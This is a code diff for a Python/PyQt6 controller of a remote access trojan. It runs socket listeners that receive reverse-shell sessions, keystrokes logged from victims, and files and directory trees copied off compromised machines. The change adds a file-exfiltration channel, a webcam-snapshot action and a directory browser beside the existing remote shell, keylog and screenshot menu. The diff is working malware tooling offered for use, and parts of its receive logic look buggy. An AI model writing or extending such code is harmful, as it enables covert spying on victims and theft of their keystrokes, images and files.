@@ -1,14 +1,13 @@
 import io
+import json
 import socket
 import threading
-from contextlib import nullcontext
 
-from PyQt6 import QtCore, QtGui, QtWidgets
-from PyQt6.QtCore import QPoint
-from PyQt6.QtWidgets import QMenu
+import  random
+
 from terminal_ui import TerminalWindow as Ui_MainWindow2
 
-from PIL import Image
+from treeview import FileManagerServer
 from keylog_ui import  MainWindow as Ui_KeylogWindow
 from PyQt6 import QtCore, QtWidgets
 from PyQt6.QtCore import QPoint
@@ -17,6 +16,7 @@ from PyQt6.QtWidgets import QApplication, QMainWindow, QTableWidgetItem, QTableW
 SERVER_HOST = socket.gethostbyname(socket.gethostname())
 SERVER_PORT_KEYLOGGER = 5000
 SERVER_PORT_SHELL = 5005
+SERVER_PORT_MANAGE_FILE = 5050
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
 # create a socket object
@@ -30,6 +30,10 @@ s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s2.bind((SERVER_HOST,SERVER_PORT_KEYLOGGER))
 s2.listen(5)
 
+s3 = socket.socket()
+s3.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s3.bind((SERVER_HOST,SERVER_PORT_MANAGE_FILE))
+s3.listen(5)
 
 
 
@@ -46,10 +50,8 @@ def reverse_shell(s1):
     print(infor)
     list_infor = infor.split(SEPARATOR)
     ui.add_row(list_infor[0],list_infor[1],list_infor[2])
-    ui.keylog_window.filename = list_infor[1] + ".txt"
     ui.keylog_window.setWindowTitle(list_infor[1] + "@KeyLog")
-
-
+    ui.keylog_window.filename = list_infor[1] + '.txt'
 
 def key_logger(s2):
     print(f"Listening as {SERVER_HOST}:{SERVER_PORT_KEYLOGGER} ...")
@@ -61,8 +63,48 @@ def key_logger(s2):
         with open(f'{str1}.txt', "a",encoding='utf-8') as file:
             try:
                 file.write(f"{str2}\n")
+                ui.keylog_window.addLine(str2)
             except Exception as e:
                 print(f"Error logging key: {e}")
+def manage_file(s3):
+    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_MANAGE_FILE} ...")
+    socket, client_add = s3.accept()
+    ui.manage_file_window.socket = socket
+    print(f"{client_add[0]}:{client_add[1]} Connected!\n")
+    data = b""
+    while True:
+        chunk = socket.recv(4096)
+        if b"<end>" in chunk:
+            data += chunk.split(b"<end>")[0]
+            break
+        data += chunk
+
+    try:
+        directory_tree = json.loads(data.decode())
+        ui.manage_file_window.populate_tree_view(directory_tree)
+    except json.JSONDecodeError as e:
+        print(f"Error decoding JSON: {e}")
+
+    while True:
+        file_name_length = socket.recv(4)  # Expecting the length of the file name
+        if not file_name_length:
+            return
+
+        file_name_length = int.from_bytes(file_name_length, 'big')  # Convert bytes to int
+        filename = "copy_" + str(random.randint(1,1000)) + "_" + socket.recv(file_name_length).decode()
+        try:
+                print(f"Copy file {filename}")
+                with open(filename, 'wb') as f:
+                    while True:
+                        data = socket.recv(BUFFER_SIZE)
+                        if b"<end>" in chunk:
+                            f.write(data.split(b"<end>")[0])
+                            break
+                        f.write(data)
+        except OSError as e:
+            print("")
+
+
 
 class Ui_MainWindow(object):
     def setupUi(self, MainWindow):
@@ -98,6 +140,8 @@ class Ui_MainWindow(object):
         # Connect right-click signal to the custom slot
         self.tableWidget.customContextMenuRequested.connect(self.onRightClick)
         self.second_window = Ui_MainWindow2()
+        self.manage_file_window = FileManagerServer()
+        # self.keylog_window = None
         self.keylog_window = Ui_KeylogWindow()
         MainWindow.setCentralWidget(self.centralwidget)
         self.menubar = QtWidgets.QMenuBar(parent=MainWindow)
@@ -136,6 +180,8 @@ class Ui_MainWindow(object):
             remoteShell = contextMenu.addAction("Remote shell")
             keylog = contextMenu.addAction("Keylog file")
             screenShot = contextMenu.addAction("Screen shot")
+            webCam = contextMenu.addAction("Webcam snapshot")
+            showDir = contextMenu.addAction("Show directory")
 
             # Execute the context menu and get the selected action
             action = contextMenu.exec(self.tableWidget.mapToGlobal(position))
@@ -144,12 +190,15 @@ class Ui_MainWindow(object):
             if action == remoteShell:
                 self.second_window.show()
             elif action == keylog:
-                print(self.keylog_window.filename)
-                self.keylog_window.show()
-                self.keylog_window.readfile()
+                ui.keylog_window.readfile()
+                ui.keylog_window.show()
             elif action == screenShot:
                 # self.srceen_shot()
                 ui.second_window.screen_shot("src")
+            elif action == webCam:
+                ui.second_window.screen_shot("webcam")
+            elif action == showDir:
+                ui.manage_file_window.show()
 
     def processInput(self, text):
         # Process the user input
@@ -161,8 +210,10 @@ class Ui_MainWindow(object):
 
 t1 = threading.Thread(target=reverse_shell, args=(s1,))
 t2 = threading.Thread(target=key_logger, args=(s2,))
+t3 = threading.Thread(target=manage_file, args=(s3,))
 t1.start()
 t2.start()
+t3.start()
 
 import sys
 app = QtWidgets.QApplication(sys.argv)
